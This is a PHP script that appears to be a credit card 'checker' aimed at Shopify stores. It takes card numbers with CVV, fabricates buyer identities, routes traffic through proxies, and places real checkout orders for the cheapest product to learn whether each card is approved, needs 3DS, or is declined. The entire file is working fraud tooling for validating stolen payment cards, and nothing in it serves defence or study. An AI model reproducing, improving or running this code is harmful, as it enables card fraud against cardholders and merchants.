<?php
/**
 * AUTOSH ADVANCED - Simplified, fully working implementation
 * Based on autog.php with performance optimizations
 * Supports all proxy types via ?proxy= parameter
 * Ultra-fast with minimal complexity
 */

error_reporting(E_ALL & ~E_DEPRECATED);
@set_time_limit(120);

$start_time = microtime(true);
$maxRetries = 2;
$retryCount = 0;

// Load required dependencies
require_once 'ho.php';
require_once 'add.php';
require_once 'no.php';

// Generate User Agent
$agent = new userAgent();
$ua = $agent->generate('windows');

// Get address data
$num_us = $randomAddress['numd'] ?? '123';
$address_us = $randomAddress['address1'] ?? 'Main Street';
$address = $num_us . ' ' . $address_us;
$city_us = $randomAddress['city'] ?? 'New York';
$state_us = $randomAddress['state'] ?? 'NY';
$zip_us = $randomAddress['zip'] ?? '10001';

// Generate phone number
$areaCode = $areaCodes[array_rand($areaCodes)] ?? '212';
$phone = sprintf("+1%d%03d%04d", $areaCode, rand(200, 999), rand(1000, 9999));

// Helper function to find strings between delimiters
function find_between($content, $start, $end) {
    $startPos = strpos($content, $start);
    if ($startPos === false) return '';
    $startPos += strlen($start);
    $endPos = strpos($content, $end, $startPos);
    if ($endPos === false) return '';
    return substr($content, $startPos, $endPos - $startPos);
}

// Get and parse credit card info
$cc1 = $_GET['cc'] ?? '';
if (empty($cc1)) {
    die(json_encode(['Response' => 'CC parameter required. Format: cc|mm|yy|cvv']));
}

$cc_partes = explode("|", $cc1);
if (count($cc_partes) < 4) {
    die(json_encode(['Response' => 'Invalid CC format. Use: cc|mm|yy|cvv']));
}

$cc = $cc_partes[0];
$month = $cc_partes[1];
$year = $cc_partes[2];
$cvv = $cc_partes[3];

// Normalize year
$yearcont = strlen($year);
if ($yearcont <= 2) {
    $year = "20$year";
}

// Convert month to integer format for Shopify
$sub_month = (int)ltrim($month, '0');
if ($sub_month < 1 || $sub_month > 12) {
    die(json_encode(['Response' => 'Invalid month: ' . $month]));
}

// Use default coordinates (saves 1-2 seconds vs geocoding API)
$lat = 40.7128; // New York latitude
$lon = -74.0060; // New York longitude

// Get random name and set email
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resposta = curl_exec($ch);
curl_close($ch);

$firstname = find_between($resposta, '"first":"', '"') ?: 'John';
$lastname = find_between($resposta, '"last":"', '"') ?: 'Doe';
$email = "user" . rand(1000, 9999) . "@gmail.com"; // Simple generated email

// Function to get minimum price product
function getMinimumPriceProductDetails(string $json): array {
    $data = json_decode($json, true);
    if (!is_array($data) || !isset($data['products'])) {
        throw new Exception('Invalid JSON format or missing products key');
    }

    $minPrice = null;
    $minPriceDetails = ['id' => null, 'price' => null, 'title' => null];

    foreach ($data['products'] as $product) {
        foreach ($product['variants'] as $variant) {
            $price = (float) $variant['price'];
            if ($price >= 0.01) {
                if ($minPrice === null || $price < $minPrice) {
                    $minPrice = $price;
                    $minPriceDetails = [
                        'id' => $variant['id'],
                        'price' => $variant['price'],
                        'title' => $product['title'],
                    ];
                }
            }
        }
    }

    if ($minPrice === null) {
        throw new Exception('No products found with price >= 0.01');
    }

    return $minPriceDetails;
}

// Get and validate site parameter
$site1 = filter_input(INPUT_GET, 'site', FILTER_SANITIZE_URL);
$site1 = parse_url($site1, PHP_URL_HOST);
$site1 = 'https://' . $site1;
$site1 = filter_var($site1, FILTER_VALIDATE_URL);

if ($site1 === false) {
    die(json_encode(['Response' => 'Invalid URL']));
}

// Configure proxy if provided
$proxy_used = false;
$proxy_str = '';
if (!empty($_GET['proxy'])) {
    $proxy_str = trim($_GET['proxy']);
    $proxy_used = true;
}

// Apply proxy to curl handle
function apply_proxy($ch, $proxy_str) {
    if (empty($proxy_str)) return;
    
    // Detect proxy type
    $proxy_type = CURLPROXY_HTTP;
    if (preg_match('/^socks5h?:\/\//i', $proxy_str)) {
        $proxy_type = CURLPROXY_SOCKS5_HOSTNAME;
        $proxy_str = preg_replace('/^socks5h?:\/\//i', '', $proxy_str);
    } elseif (preg_match('/^socks5:\/\//i', $proxy_str)) {
        $proxy_type = CURLPROXY_SOCKS5;
        $proxy_str = preg_replace('/^socks5:\/\//i', '', $proxy_str);
    } elseif (preg_match('/^socks4a?:\/\//i', $proxy_str)) {
        $proxy_type = CURLPROXY_SOCKS4A;
        $proxy_str = preg_replace('/^socks4a?:\/\//i', '', $proxy_str);
    } elseif (preg_match('/^https?:\/\//i', $proxy_str)) {
        $proxy_type = CURLPROXY_HTTP;
        $proxy_str = preg_replace('/^https?:\/\//i', '', $proxy_str);
    }
    
    // Parse auth if present (format: user:pass@host:port or host:port:user:pass)
    $auth = '';
    if (preg_match('/^(.+):(.+)@(.+):(\d+)$/', $proxy_str, $m)) {
        $auth = $m[1] . ':' . $m[2];
        $proxy_str = $m[3] . ':' . $m[4];
    } elseif (preg_match('/^(.+):(\d+):(.+):(.+)$/', $proxy_str, $m)) {
        $auth = $m[3] . ':' . $m[4];
        $proxy_str = $m[1] . ':' . $m[2];
    }
    
    curl_setopt($ch, CURLOPT_PROXY, $proxy_str);
    curl_setopt($ch, CURLOPT_PROXYTYPE, $proxy_type);
    if (!empty($auth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $auth);
    }
}

// Get products from site
$site2 = parse_url($site1, PHP_URL_SCHEME) . "://" . parse_url($site1, PHP_URL_HOST);
$site = "$site2/products.json";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $site);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $ua,
    'Accept: application/json',
]);
apply_proxy($ch, $proxy_str);

$r1 = curl_exec($ch);
curl_close($ch);

if ($r1 === false) {
    die(json_encode(['Response' => 'Failed to fetch products']));
}

try {
    $productDetails = getMinimumPriceProductDetails($r1);
    $minPriceProductId = $productDetails['id'];
    $minPrice = $productDetails['price'];
    $productTitle = $productDetails['title'];
} catch (Exception $e) {
    die(json_encode(['Response' => $e->getMessage()]));
}

if (empty($minPriceProductId)) {
    die(json_encode(['Response' => 'Product id is empty']));
}

$urlbase = $site1;
$domain = parse_url($urlbase, PHP_URL_HOST);
$cookie = 'cookie_' . uniqid() . '.txt';
$prodid = $minPriceProductId;

// Add product to cart
cart:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase . '/cart/' . $prodid . ':1');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $ua,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
]);
apply_proxy($ch, $proxy_str);

$response = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    }
    die(json_encode(['Response' => 'Cart add failed: ' . curl_error($ch), 'Time' => round(microtime(true) - $start_time, 2) . 's']));
}
curl_close($ch);

// Extract checkout tokens
$web_build_id = find_between($response, 'sha&quot;:&quot;', '&quot;}');
$x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
$queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
$stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
$paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');

if (empty($web_build_id) || empty($x_checkout_one_session_token) || empty($queue_token) || empty($stable_id) || empty($paymentMethodIdentifier)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    }
    die(json_encode(['Response' => 'Cloudflare Bypass Failed or Missing Tokens', 'Time' => round(microtime(true) - $start_time, 2) . 's']));
}

// Extract checkout URL and token
preg_match('/Location: ([^\r\n]+)/', $response, $matches);
$checkouturl = $matches[1] ?? '';
$checkoutToken = '';
if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
    $checkoutToken = $matches[1];
}

// Tokenize credit card
card:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $ua,
    'Content-Type: application/json',
    'Accept: application/json',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'credit_card' => [
        'number' => $cc,
        'month' => $sub_month,
        'year' => (int)$year,
        'verification_value' => $cvv,
        'name' => $firstname . ' ' . $lastname
    ],
    'payment_session_scope' => $domain
]));
apply_proxy($ch, $proxy_str);

$response2 = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card;
    }
    die(json_encode(['Response' => 'Card tokenization failed', 'Time' => round(microtime(true) - $start_time, 2) . 's']));
}
curl_close($ch);

$response2js = json_decode($response2, true);
$cctoken = $response2js['id'] ?? '';

if (empty($cctoken)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card;
    }
    die(json_encode(['Response' => 'Card Token is empty', 'Time' => round(microtime(true) - $start_time, 2) . 's']));
}

// Submit payment (simplified - single attempt)
usleep(100000); // 0.1s delay

$totalamt = $minPrice;
$postf = json_encode([
    'query' => 'mutation SubmitForCompletion($input:SubmitForCompletionInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:SubmitForCompletionAnalytics){submitForCompletion(input:$input,attemptToken:$attemptToken,metafields:$metafields,analytics:$analytics){__typename}}',
    'variables' => [
        'input' => [
            'sessionInput' => ['sessionToken' => $x_checkout_one_session_token],
            'queueToken' => $queue_token,
            'discounts' => ['lines' => [], 'acceptUnexpectedDiscounts' => true],
            'delivery' => [
                'deliveryLines' => [[
                    'destination' => ['streetAddress' => [
                        'address1' => $address,
                        'address2' => '',
                        'city' => $city_us,
                        'countryCode' => 'US',
                        'postalCode' => $zip_us,
                        'firstName' => $firstname,
                        'lastName' => $lastname,
                        'zoneCode' => $state_us,
                        'phone' => $phone,
                        'oneTimeUse' => false,
                        'coordinates' => ['latitude' => $lat, 'longitude' => $lon]
                    ]],
                    'selectedDeliveryStrategy' => [
                        'deliveryStrategyMatchingConditions' => [
                            'estimatedTimeInTransit' => ['any' => true],
                            'shipments' => ['any' => true]
                        ],
                        'options' => new stdClass()
                    ],
                    'targetMerchandiseLines' => ['lines' => [['stableId' => $stable_id]]],
                    'deliveryMethodTypes' => ['SHIPPING', 'LOCAL'],
                    'expectedTotalPrice' => ['any' => true],
                    'destinationChanged' => false
                ]],
                'noDeliveryRequired' => [],
                'useProgressiveRates' => false,
                'supportsSplitShipping' => true
            ],
            'merchandise' => [
                'merchandiseLines' => [[
                    'stableId' => $stable_id,
                    'merchandise' => ['productVariantReference' => [
                        'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                        'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                        'properties' => [],
                        'sellingPlanId' => null
                    ]],
                    'quantity' => ['items' => ['value' => 1]],
                    'expectedTotalPrice' => ['value' => ['amount' => $minPrice, 'currencyCode' => 'USD']],
                    'lineComponents' => []
                ]]
            ],
            'payment' => [
                'totalAmount' => ['any' => true],
                'paymentLines' => [[
                    'paymentMethod' => ['directPaymentMethod' => [
                        'paymentMethodIdentifier' => $paymentMethodIdentifier,
                        'sessionId' => $cctoken,
                        'billingAddress' => ['streetAddress' => [
                            'address1' => $address,
                            'city' => $city_us,
                            'countryCode' => 'US',
                            'postalCode' => $zip_us,
                            'firstName' => $firstname,
                            'lastName' => $lastname,
                            'zoneCode' => $state_us,
                            'phone' => $phone
                        ]]
                    ]],
                    'amount' => ['value' => ['amount' => $totalamt, 'currencyCode' => 'USD']]
                ]],
                'billingAddress' => ['streetAddress' => [
                    'address1' => $address,
                    'city' => $city_us,
                    'countryCode' => 'US',
                    'postalCode' => $zip_us,
                    'firstName' => $firstname,
                    'lastName' => $lastname,
                    'zoneCode' => $state_us,
                    'phone' => $phone
                ]]
            ],
            'buyerIdentity' => [
                'customer' => ['presentmentCurrency' => 'USD', 'countryCode' => 'US'],
                'email' => $email,
                'emailChanged' => false
            ],
            'tip' => ['tipLines' => []],
            'taxes' => ['proposedAllocations' => null, 'proposedTotalAmount' => ['value' => ['amount' => '0', 'currencyCode' => 'USD']]],
            'note' => ['message' => null, 'customAttributes' => []],
            'nonNegotiableTerms' => null
        ],
        'attemptToken' => $checkoutToken . '-0a6d87fj9zmj',
        'metafields' => [],
        'analytics' => ['requestUrl' => $urlbase . '/checkouts/cn/' . $checkoutToken, 'pageId' => $stable_id]
    ],
    'operationName' => 'SubmitForCompletion'
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase . '/checkouts/unstable/graphql?operationName=SubmitForCompletion');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $ua,
    'Content-Type: application/json',
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-source-id: ' . $checkoutToken,
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postf);
apply_proxy($ch, $proxy_str);

$response4 = curl_exec($ch);
curl_close($ch);

$response4js = json_decode($response4);
$recipt_id = $response4js->data->submitForCompletion->receipt->id ?? '';

if (empty($recipt_id)) {
    die(json_encode(['Response' => 'Receipt ID empty', 'Time' => round(microtime(true) - $start_time, 2) . 's']));
}

// Poll for receipt
usleep(100000); // 0.1s delay

$postf2 = json_encode([
    'query' => 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename...on ProcessedReceipt{id}...on FailedReceipt{processingError{code}}}}',
    'variables' => ['receiptId' => $recipt_id, 'sessionToken' => $x_checkout_one_session_token],
    'operationName' => 'PollForReceipt'
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase . '/checkouts/unstable/graphql?operationName=PollForReceipt');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $ua,
    'Content-Type: application/json',
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-source-id: ' . $checkoutToken,
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);
apply_proxy($ch, $proxy_str);

$response5 = curl_exec($ch);
curl_close($ch);

// Cleanup cookie file
@unlink($cookie);

$time_taken = round(microtime(true) - $start_time, 2);

// Parse response
if (strpos($response5, '"__typename":"ProcessedReceipt"') !== false ||
    strpos($response5, 'thank_you') !== false ||
    strpos($response5, 'Thank you') !== false ||
    strpos($response5, 'success') !== false) {
    
    echo json_encode([
        'Response' => 'Thank You (Approved)',
        'Price' => $totalamt,
        'CC' => $cc1,
        'Site' => $urlbase,
        'Time' => $time_taken . 's',
        'Proxy' => $proxy_used ? 'Used' : 'Direct'
    ]);
    
} elseif (strpos($response5, 'CompletePaymentChallenge') !== false ||
          strpos($response5, 'authentication') !== false) {
    
    echo json_encode([
        'Response' => '3DS Authentication Required',
        'Price' => $totalamt,
        'CC' => $cc1,
        'Time' => $time_taken . 's',
        'Proxy' => $proxy_used ? 'Used' : 'Direct'
    ]);
    
} else {
    $r5js = json_decode($response5);
    $err = $r5js->data->receipt->processingError->code ?? 'Response Not Found';
    
    echo json_encode([
        'Response' => $err,
        'Price' => $totalamt,
        'CC' => $cc1,
        'Time' => $time_taken . 's',
        'Proxy' => $proxy_used ? 'Used' : 'Direct'
    ]);
}
